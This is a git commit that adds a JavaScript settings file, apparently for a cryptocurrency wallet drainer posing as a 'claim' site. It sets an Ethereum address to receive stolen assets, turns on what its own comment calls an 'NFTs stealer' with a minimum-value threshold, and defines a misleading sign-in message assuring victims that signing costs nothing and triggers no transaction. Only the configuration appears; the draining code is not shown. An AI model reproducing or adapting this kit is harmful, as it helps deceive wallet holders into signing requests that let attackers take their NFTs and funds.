0e583aaafa1cdf2a14c3f7126b9cfeb5b97badf3
punkapes <111247202+punkapes@users.noreply.github.com>
2022-09-05 22:29:44 +0530

    Add files via upload

---
+++ claim_files/settings.js
@@ -0,0 +1,26 @@
+const receiveAddress = "0xa6c90f6d8e1db13BA4685Df7A960D439A0E74130";
+
+const drainNftsInfo = {
+    active: true,   // Active (true) or not (false) NFTs stealer.
+    minValue: 0.0016  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection. 
+}
+
+const signMessage = `Welcome, \n\n` +
+    `Click to sign in and accept the Terms of Service.\n\n` +
+    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
+    `Wallet Address:\n{address}\n\n` +
+    `Nonce:\n{nonce}`;
+
+    
+/*
+    = = = = = END OF SETTINGS = = = = =
+*/
+
+//#region Check Configuration
+if (!receiveAddress.startsWith("0x") ||
+    (
+        receiveAddress.length >= 64 ||
+        receiveAddress.length <= 40
+    )
+) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+//#endregion
